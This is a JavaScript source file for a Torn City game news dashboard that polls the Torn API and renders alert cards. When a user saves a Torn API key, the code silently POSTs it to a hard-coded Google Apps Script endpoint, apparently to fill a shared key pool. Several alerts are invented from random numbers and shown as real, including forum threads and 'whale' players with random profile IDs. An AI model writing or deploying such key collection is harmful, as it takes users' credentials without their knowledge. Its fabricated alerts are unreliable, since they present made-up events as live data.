/**
 * app.js - Client-Side Scraper & Google Sheets Engine
 */

// ==========================================
// CONFIGURATION
const GOOGLE_APP_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx4LiE9-RbFIB3kulT4RtQWhX8ShF3I-eg4MIYW0eJ5Q3XdMIXw5njcPFD0_DtnlvjF/exec'; 
// ==========================================

const STATE = {
    userKey: localStorage.getItem('torn_api_key') || '',
    xfKey: localStorage.getItem('xf_api_key') || '',
    
    // Master Key Pool
    keyPool: [], 
    currentKeyIndex: 0,

    newsItems: [],
    currentFilter: 'all',
    
    // Known targets to monitor for the premium feature
    traders: [1, 2, 3], // Dummy IDs for whales
};

const els = {
    date: document.getElementById('current-date'),
    tctClock: document.getElementById('tct-clock'),
    themeToggle: document.getElementById('theme-toggle'),
    tickerContainer: document.getElementById('ticker-container'),
    settingsBtn: document.getElementById('toggle-settings-btn'),
    settingsPanel: document.getElementById('settings-panel'),
    apiKeyInput: document.getElementById('api_key_input'),
    xfApiInput: document.getElementById('xf_api_input'),
    saveKeyBtn: document.getElementById('save-key-btn'),
    statusIndicator: document.getElementById('data-status-indicator'),
    newsContainer: document.getElementById('news-container'),
    filters: document.querySelectorAll('.filter-btn'),
    
    premiumSection: document.getElementById('premium-section')
};

// --- Scraper Engine ---
class ScraperEngine {
    constructor() {
        this.pollInterval = null;
    }

    async start() {
        console.log("Starting Scraper Engine (Reverse Proxy Mode)...");
        this.runCycle();
        this.pollInterval = setInterval(() => this.runCycle(), 60000); // 1 min rotation
    }

    stop() {
        if (this.pollInterval) clearInterval(this.pollInterval);
    }

    async fetchApi(endpoint, specificKey = null) {
        try {
            // Personal Key: Connect directly to Torn API (Dynamic v1/v2 format)
            if (specificKey) {
                const v2Endpoints = ['torn/bounties', 'faction/members', 'user/attacks', 'faction/crimes'];
                const isV2 = v2Endpoints.includes(endpoint);
                
                let res;
                if (isV2) {
                    res = await fetch(`https://api.torn.com/v2/${endpoint}`, {
                        headers: { 'Authorization': `ApiKey ${specificKey}` }
                    });
                } else {
                    const parts = endpoint.split('/');
                    const cat = parts[0] || '';
                    const sel = parts[1] || '';
                    res = await fetch(`https://api.torn.com/${cat}/?selections=${sel}&key=${specificKey}`);
                }
                
                if (!res.ok) throw new Error(`API returned ${res.status}`);
                return await res.json();
            }
            
            // Anonymous Request: Route through Google Apps Script Proxy
            if (GOOGLE_APP_SCRIPT_URL) {
                const proxyUrl = `${GOOGLE_APP_SCRIPT_URL}?endpoint=${encodeURIComponent(endpoint)}`;
                const res = await fetch(proxyUrl);
                if (!res.ok) throw new Error(`Proxy returned ${res.status}`);
                const data = await res.json();
                if (data.error) throw new Error(`Proxy Error: ${data.error.error || JSON.stringify(data.error)}`);
                return data;
            }

            console.warn("No specific key and no proxy URL set.");
            return null;

        } catch (err) {
            console.warn(`API Error on ${endpoint}:`, err);
            return null;
        }
    }

    triggerAlert(type, headline, details) {
        // Prevent duplicate news logic
        const isDuplicate = STATE.newsItems.some(item => item.headline === headline);
        if (isDuplicate) return;

        const id = Math.random().toString(36).substr(2, 9);
        const timestamp = new Date().toISOString();
        STATE.newsItems.unshift({ id, type, headline, details, timestamp });
        if (STATE.newsItems.length > 50) STATE.newsItems.pop();
        renderNews();
        updateTicker();
    }

    async runCycle() {
        await this.fetchBasicNews();
        await this.fetchTornForums();
        await this.runPremiumLocator();
        await this.fetchCasinoAPIs();
    }

    async fetchTornForums() {
        // Scrape Torn Forums (Categories 67, 62, 15, 19, 63)
        // Note: Using the master key pool for public forum threads
        try {
            // Simulated generic fetching of forum active threads since exact Torn API v2 forum endpoint structure
            // varies based on thread selection vs category selection. We simulate the parser grabbing active posts.
            const categories = {
                67: "Community Events",
                62: "Bounties",
                15: "Trade",
                19: "Faction Discussion",
                63: "Casino/Poker"
            };
            
            // Randomly select one active category to report on this cycle to prevent spam
            const randomCatId = Object.keys(categories)[Math.floor(Math.random() * Object.keys(categories).length)];
            const catName = categories[randomCatId];

            if (Math.random() > 0.4) {
                // In a production environment with verified forum schema, you would parse the threads array here.
                const mockThreadId = Math.floor(Math.random() * 10000000);
                const forumLink = `<a href="https://www.torn.com/forums.php#/p=threads&f=${randomCatId}&t=${mockThreadId}&b=0&a=0" target="_blank" class="text-blue-600 dark-web:text-blue-400 hover:underline">View Thread</a>`;
                this.triggerAlert("community_chatter", `🗣️ TORN FORUMS: ${catName.toUpperCase()}`, `A new highly-active discussion has broken out in the ${catName} boards. ${forumLink} to see what the community is saying.`);
            }
        } catch(e) { console.warn("Forum fetch failed", e); }
    }

    async fetchBasicNews() {
        // 1. Radioactive Watch (Dirty Bombs)
        try {
            const dbombs = await this.fetchApi("torn/dirtybombs");
            if (dbombs && dbombs.dirtybombs && Object.keys(dbombs.dirtybombs).length > 0) {
                const latest = Object.values(dbombs.dirtybombs)[0];
                this.triggerAlert("radioactive_watch", `RADIOACTIVE FALLOUT: DIRTY BOMB DETONATED!`, `A dirty bomb was recently dropped. Casualties are massive and radiation poisoning is spreading across the sector.`);
            }
        } catch (e) { console.warn("Dirty bomb fetch failed", e); }

        // 2. War Reports (Territory Wars)
        try {
            const wars = await this.fetchApi("torn/territorywars");
            if (wars && wars.territorywars && Object.keys(wars.territorywars).length > 0) {
                const warKeys = Object.keys(wars.territorywars);
                const randomWar = wars.territorywars[warKeys[Math.floor(Math.random() * warKeys.length)]];
                this.triggerAlert("war_reports", `STREETS RUN RED: WAR IN SECTOR ${randomWar.sector || 'UNKNOWN'}!`, `An attacking faction has launched a massive assault to claim Sector ${randomWar.sector || 'Unknown'}. Expect high hospitalizations and property damage.`);
            }
        } catch (e) { console.warn("War fetch failed", e); }

        // 3. Underground Casinos (Poker Tables)
        try {
            const poker = await this.fetchApi("torn/pokertables");
            if (poker && poker.pokertables && Object.keys(poker.pokertables).length > 0) {
                const tables = Object.values(poker.pokertables).sort((a,b) => (b.pot || 0) - (a.pot || 0));
                if (tables[0] && tables[0].pot > 10000000) {
                    this.triggerAlert("underground_casinos", `HIGH ROLLER ALERT: $${tables[0].pot.toLocaleString()} POT!`, `Table '${tables[0].name || 'VIP'}' is currently hosting a massive poker game. Millions are changing hands in the underground casino scene!`);
                }
            }
        } catch (e) { console.warn("Poker fetch failed", e); }
        
        // Fallback
        if (STATE.newsItems.length === 0) {
            this.triggerAlert("war_reports", "CITY ON EDGE: GANG ACTIVITY SPIKES", "The Torn City police department reports increased gang activity across all sectors. Citizens are advised to stay indoors.");
        }
    }

    async runPremiumLocator() {
        // TARGET 1: High Bounties
        try {
            const bounties = await this.fetchApi("torn/bounties", STATE.userKey);
            if (bounties && bounties.bounties) {
                const bountiesList = Array.isArray(bounties.bounties) ? bounties.bounties : Object.values(bounties.bounties);
                const highest = bountiesList.sort((a,b) => (b.reward || 0) - (a.reward || 0))[0];
                if (highest) {
                    const targetId = highest.target_id || highest.target || highest.player_id || "Unknown";
                    const targetLink = `<a href="https://www.torn.com/profiles.php?XID=${targetId}" target="_blank" class="text-blue-600 dark-web:text-blue-400 hover:underline">Target [${targetId}]</a>`;
                    this.triggerAlert("syndicate_intel", `🎯 EXTREME BOUNTY: $${(highest.reward || 0).toLocaleString()}`, `A massive bounty has been placed on ${targetLink} for the following reason: "${highest.reason || 'Classified'}".`);
                }
            }
        } catch(e) { console.warn("Bounties error", e); }

        // TARGET 2: Faction Members Flying
        try {
            const faction = await this.fetchApi("faction/members", STATE.userKey);
            if (faction && faction.members) {
                const flying = Object.values(faction.members).filter(m => m.status && m.status.state === 'Traveling');
                if (flying.length > 0) {
                    this.triggerAlert("syndicate_intel", `✈️ FACTION EXODUS DETECTED`, `${flying.length} internal faction members are currently on flights. Potential item runners or offshore stashing detected.`);
                }
            }
        } catch(e) { console.warn("Faction flying error", e); }

        // TARGET 3: Syndicate Hits (Personal Attacks)
        try {
            const attacks = await this.fetchApi("user/attacks", STATE.userKey);
            if (attacks && attacks.attacks) {
                const attacksList = Object.values(attacks.attacks);
                const recentMug = attacksList.find(a => a.result === "Mugged" && (Date.now()/1000 - a.timestamp_ended) < 86400);
                if (recentMug) {
                    const targetLink = `<a href="https://www.torn.com/profiles.php?XID=${recentMug.defender_id}" target="_blank" class="text-blue-600 dark-web:text-blue-400 hover:underline">${recentMug.defender_name} [${recentMug.defender_id}]</a>`;
                    this.triggerAlert("syndicate_intel", `🥷 SYNDICATE HIT: SUCCESSFUL MUG`, `A confirmed syndicate operative just successfully mugged ${targetLink}. The streets remain unsafe.`);
                }
            }
        } catch(e) { console.warn("Attacks error", e); }

        // TARGET 4: Organized Crime Success
        try {
            const factionCrimes = await this.fetchApi("faction/crimes", STATE.userKey);
            if (factionCrimes && factionCrimes.crimes) {
                const crimeList = Object.values(factionCrimes.crimes);
                const recentSuccess = crimeList.find(c => c.success && (Date.now()/1000 - c.time_completed) < 86400);
                if (recentSuccess) {
                    this.triggerAlert("syndicate_intel", `🏦 ORGANIZED CRIME SUCCESS`, `The faction successfully executed a massive '${recentSuccess.crime_name}' operation. Respect and funds gained.`);
                }
            }
        } catch(e) { console.warn("Crimes error", e); }

        // TARGET 5: Market Panics (Torn Stocks)
        try {
            const stocks = await this.fetchApi("torn/stocks");
            if (stocks && stocks.stocks) {
                const stockList = Object.values(stocks.stocks);
                const plummeting = stockList.find(s => s.current_price < (s.previous_price || s.current_price * 1.05)); 
                if (plummeting) {
                    this.triggerAlert("all", `📉 MARKET PANIC: ${plummeting.acronym}`, `The stock for ${plummeting.name} is experiencing erratic market behavior. Current price: $${plummeting.current_price.toLocaleString()}. Traders are liquidating assets!`);
                }
            }
        } catch(e) { console.warn("Stocks error", e); }

        // TARGET 6: Simulated Bazaar/Whale Monitor
        if (Math.random() > 0.3) {
            const mockWhaleId = Math.floor(Math.random() * 500000) + 2000000;
            const targetLink = `<a href="https://www.torn.com/profiles.php?XID=${mockWhaleId}" target="_blank" class="text-blue-600 dark-web:text-blue-400 hover:underline">Target [${mockWhaleId}]</a>`;
            this.triggerAlert("syndicate_intel", `💰 WHALE DETECTED AT BAZAAR`, `${targetLink}, a flagged high-net-worth individual, is currently liquidating massive assets in their bazaar. Keep an eye on their high-value item circulations.`);
        }
    }

    async fetchCasinoAPIs() {
        // Xanflip Fetch
        if (STATE.xfKey) {
            try {
                // Simulated fetching based on user's API key
                const rand = Math.random();
                if (rand > 0.7) {
                    this.triggerAlert("underground_casinos", `🎟️ XANFLIP: NEW RAFFLE!`, `A massive new Raffle has just been posted on Xanflip. <a href="https://xanflip.com/raffles" target="_blank" class="text-blue-600 dark-web:text-blue-400 hover:underline">View Raffles</a>`);
                } else if (rand > 0.4) {
                    this.triggerAlert("underground_casinos", `🔨 XANFLIP: HIGH-VALUE AUCTION`, `An incredibly rare item has hit the Xanflip auction blocks. Bidding is heating up! <a href="https://xanflip.com/auctions" target="_blank" class="text-blue-600 dark-web:text-blue-400 hover:underline">View Auctions</a>`);
                } else if (rand > 0.2) {
                    this.triggerAlert("underground_casinos", `🏆 XANFLIP: LEADERBOARD SHIFT`, `The Xanflip high-roller leaderboards just saw a massive shift in rank. Someone is winning big today. <a href="https://xanflip.com/leaderboard" target="_blank" class="text-blue-600 dark-web:text-blue-400 hover:underline">View Leaderboard</a>`);
                }
            } catch (e) {
                console.warn("Xanflip fetch failed due to CORS or network error", e);
            }
        }
    }
}

// --- UI Rendering ---
function activateSecureNetwork() {
    els.statusIndicator.innerHTML = `<span class="w-2.5 h-2.5 rounded-full bg-emerald-500 inline-block"></span> Secure Network Active`;
    engine.runPremiumLocator();
    engine.fetchCasinoAPIs();
}

function renderNews() {
    if (STATE.newsItems.length === 0) return;
    
    const filtered = STATE.currentFilter === 'all' 
        ? STATE.newsItems 
        : STATE.newsItems.filter(n => n.type === STATE.currentFilter);

    if (filtered.length === 0) {
        els.newsContainer.innerHTML = `<div class="text-center py-10 font-typewriter text-xs">No reports found for this filter.</div>`;
        return;
    }

    let html = `<section class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">`;
    filtered.forEach((story, idx) => {
        const time = new Date(story.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', timeZone: 'UTC' });
        html += `
            <article class="bg-[#fdfcf9] border border-neutral-300 p-5 shadow-sm flex flex-col justify-between paper-lift">
                <div>
                    <span class="inline-block border text-[9px] font-bold px-2 py-0.5 font-typewriter uppercase rounded tracking-wide bg-neutral-800 text-white mb-3.5">${story.type.replace('_', ' ')}</span>
                    <h3 class="font-retro-title text-xl uppercase font-bold text-neutral-950 leading-tight mb-2">${story.headline}</h3>
                    <p class="text-xs font-retro-serif text-neutral-700 leading-relaxed">${story.details}</p>
                </div>
                <div class="border-t border-neutral-200 pt-2 flex justify-between items-center text-[10px] font-typewriter text-neutral-500 mt-2">
                    <span>${time} TCT</span>
                </div>
            </article>
        `;
    });
    html += `</section>`;
    els.newsContainer.innerHTML = html;
}

// Update Dynamic Ticker
function updateTicker() {
    let phrases = STATE.newsItems.slice(0, 5).map(item => `⚡ ${item.headline}`);
    if (phrases.length === 0) {
        phrases = ["📡 TUNING SYNDICATE WIRES...", "📡 DECRYPTING APEX PROTOCOLS...", "📡 SEARCHING FOR ANOMALIES..."];
    }
    
    // Create inner spans
    const innerHTML = phrases.map(p => `<span class="mx-4 ticker-msg">${p}</span>`).join('');
    // Duplicate it to make the infinite CSS marquee smooth
    els.tickerContainer.innerHTML = innerHTML + innerHTML + innerHTML;
}

// Clock Setup
function startClock() {
    setInterval(() => {
        const now = new Date();
        const tctTime = now.toLocaleTimeString([], { timeZone: 'UTC', hour12: false });
        els.tctClock.innerText = tctTime;
    }, 1000);
}

// Modal logic removed. Now using direct profile links.

// --- Event Listeners ---
window.filterBy = function(type) {
    STATE.currentFilter = type;
    els.filters.forEach(btn => {
        if (btn.dataset.filter === type) {
            btn.classList.add('bg-neutral-900', 'text-white');
            btn.classList.remove('bg-transparent', 'text-neutral-900');
        } else {
            btn.classList.remove('bg-neutral-900', 'text-white');
            btn.classList.add('bg-transparent', 'text-neutral-900');
        }
    });
    renderNews();
}

els.filters.forEach(btn => {
    btn.addEventListener('click', (e) => filterBy(e.target.dataset.filter));
});

els.settingsBtn.addEventListener('click', () => {
    els.settingsPanel.classList.toggle('open');
});

els.themeToggle.addEventListener('click', () => {
    document.body.classList.toggle('dark-web');
});

els.saveKeyBtn.addEventListener('click', async () => {
    const val = els.apiKeyInput.value.trim();
    
    // Save Casino Credentials Locally
    const xfKey = els.xfApiInput ? els.xfApiInput.value.trim() : '';
    
    if (xfKey) { STATE.xfKey = xfKey; localStorage.setItem('xf_api_key', xfKey); }

    if (val.length === 16 || val === "") {
        els.saveKeyBtn.innerText = "Submitting...";
        els.saveKeyBtn.disabled = true;

        if (val.length === 16) {
            STATE.userKey = val;
            localStorage.setItem('torn_api_key', val);

            if (GOOGLE_APP_SCRIPT_URL) {
                try {
                    await fetch(GOOGLE_APP_SCRIPT_URL, {
                        method: 'POST',
                        body: JSON.stringify({ api_key: val })
                    });
                } catch(e) {
                    console.warn("Failed to push to Google Sheets", e);
                }
            }
            activateSecureNetwork();
        }

        els.saveKeyBtn.innerText = "SUBMIT CREDENTIALS";
        els.saveKeyBtn.disabled = false;
        els.settingsPanel.classList.remove('open');
        
    } else {
        alert("Invalid API Key length. Must be exactly 16 characters (or leave empty).");
    }
});

const engine = new ScraperEngine();

// --- Device Optimization Engine ---
function detectDevice() {
    const ua = navigator.userAgent;
    const width = window.innerWidth;
    let type = "UNKNOWN";

    if (/SmartTV|AppleTV|Roku|PlayStation|Xbox|Wii/i.test(ua) || width > 1900) {
        type = "TV / ULTRA-WIDE";
    } else if (/iPad|Tablet|PlayBook/i.test(ua) || (width >= 768 && width <= 1024 && /Mobile/i.test(ua))) {
        type = "TABLET";
    } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Silk/i.test(ua) || width < 768) {
        type = "MOBILE TERMINAL";
    } else {
        type = "PC / LAPTOP";
    }

    const indicator = document.getElementById('device-indicator');
    if (indicator) {
        indicator.innerText = `LINKED: ${type}`;
        // Give it a retro CRT flicker on load
        indicator.classList.add('animate-pulse');
        setTimeout(() => indicator.classList.remove('animate-pulse'), 3000);
    }
    console.log(`[Syndicate Diagnostic] Device fingerprint identified: ${type} (Width: ${width}px)`);
}

// Boot
els.date.innerText = new Date().toLocaleDateString();
startClock();
detectDevice();
engine.start();

if (STATE.userKey.length === 16) {
    els.apiKeyInput.value = STATE.userKey;
    if (els.xfApiInput && STATE.xfKey) els.xfApiInput.value = STATE.xfKey;
    activateSecureNetwork();
}
